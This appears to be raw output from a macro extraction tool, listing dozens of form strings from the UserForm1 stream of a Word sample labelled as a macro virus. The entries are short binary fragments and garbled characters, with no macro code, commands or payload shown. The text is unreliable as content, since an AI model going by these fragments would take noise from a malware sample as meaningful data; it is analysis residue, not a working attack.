- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y5kyX��r��G{�Fs�H��H��=k�a��P��4cy;ZaFs�*RiFs�P��X��s��O{�=k�@��i��X��j��a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8'9I'9I1JaCZiKZi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!YMky
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A BaMk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)i$!Y.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BQ8BI79I8Ba79a8Ba61i.1a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A$!Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i&1i%)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a�֢>s�r��Fs�O{�O{�H��=k�Ek�Ns�3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0@��1JYO{�@��5k�i��W{�r��<c�P��P�� Ba2Ri*Ra:RY1JQ;ZiCZq1JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!q%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0%)Q&1q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!00BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i&1i.1i%)iJRa	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)(8BI0BY0BY%)a.1i%)a%)a&1i%)a.1q%)i%)a%)i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a%)i%)a%)i&1i&1a%)i%)Y&1a%)i%)a&1i%)i%)a%)i%)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y�֢4cyG{�Ek�r��Fs�j��O{�*Ra)Ja*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9YNs�2RaO{�Ns�<cq_{�`�����W{�2Ri4cqCZqCZiDcqLcqDcqCZqDci;Zi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 &1Q%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y'9a%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!879YUk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a&1iAJq%)a9JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i.1i.1i&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a�΢"Ria��O{�j��Ns�r��>s�O{�)Ji<cy<cy5ky<ci3Za)Ja*RiVsyX��O{�P��Uky4cq<cq;Zq;ZiCZi;ZqUkqUkqBRi)Ja:Ra(BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0 BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A BI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0$!0

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1I2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A0B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!Q/9y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!i4c�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i%)a8By.1a.1i	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! &1a&1i&1i.1a&1i%)a%)a&1i%)a61a%)a%)a&1i$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I$!Q$!Y%)Y%)a%)i%)a&1i%)i.1i%)i.1i.1a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)i&1i%)a%)a%)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)0-)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y�ΚMkiFs�i��X��X��j��G{�>s�)JiP��<cy5k�<cq3Zq'9QDcqa��a��3ZaQ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)83ZiUky3Zi3ZiLcqLcq;ZiDcq3Zi1Ja2Ra BQ'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8'9I1JI(BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A/9A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 .1A%)I1Ja/9a9J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0Dcq&1a%)i&1q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!(61Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AUk�%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)a%)Y%)i%)i61a61a%)a&1i%)a%)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?98%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a�Κ4cyW{�a��+ZqO{�X��4cy*Rq*Ri*Ri!Ji!Ji<ci*Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9QNsyY��b��EkyW{�;Za1JQ2RY^s�*RaUkyCZq2Ra2Ri;Zi2Ra1Ja2Ra:Ra;Za BI(BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!879i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8Vs�%)q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I'9�H��%)A.1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&1i%)a61Y%)a%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! SZi&1Y&1i.1i&1i?9i.1Y%)a79i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q%)a.1i%)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a&1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a.1i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)a%)i%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a�Β�ΒNs�4cqEkyVsyH��P��3Z�+Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bi<ca
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8!JaX��j��i��z��EkiEky3ZiMkyUky;ZaUky3Zi*RaCZi;Zi2Ra2RiCZa1JaCZi:Ra:Ra2RaCZi(BQ1JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0/9Q%)Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
